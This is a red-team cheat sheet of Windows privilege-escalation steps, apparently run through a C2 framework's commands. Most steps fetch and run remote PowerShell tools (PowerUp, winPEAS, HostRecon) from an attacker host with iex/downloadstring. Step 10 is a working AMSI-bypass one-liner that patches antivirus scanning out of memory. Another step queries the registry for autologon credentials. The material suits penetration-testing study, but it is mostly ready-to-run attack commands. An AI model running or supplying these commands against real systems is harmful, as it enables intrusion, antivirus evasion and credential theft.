# PrivEsc Checks

### 1) Check privs - using BOF or with execute

    sa-whoami
    execute -o whoami /all

### 2) Enumerate Permissions

    seatbelt -- -group=all
    seatbelt -- -group=user

### 3) Run SharpUp to audit

    sharpup -- audit
    sharpup -i -- audit

### 4) Run PowerUp

    sharpsh -t 40 -- '-u http://10.10.10.11/powershell-scripts/PowerUp.ps1 -c "Invoke-AllChecks"'

### 5) # We can modify a service, check Get-ServiceAcl what we can modify/create

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/Get-ServiceAcl.ps1 -c "Get-ServiceAcl -Name SNMPTRAP | select -expand Access"'

### 6) Check Registry for autologon

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

### 7) HostRecon

    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/HostRecon.ps1 -c "Invoke-HostRecon"'

### 8) Footholder-V3.ps1

    sharpsh -t 200 -- '-u http://10.10.10.11/powershell-scripts/Footholder-V3.ps1 -c 1'

### 9) winPEAS - 400 secs wait - better to do interactively

    sharpsh -t 400 -- '-u http://10.10.10.11/powershell-scripts/winPEAS.ps1 -c 1'

### 10) Winpeas - With oneliner AMSI bypass

    shell
    $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1) 
    iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/winPEAS.ps1'))

### 11) Load within powershell itself (when required)

    powershell -ep bypass
    iex((new-object system.net.webclient).downloadstring('http://10.10.10.11/powershell-scripts/PowerUp.ps1'))
    Invoke-AllChecks
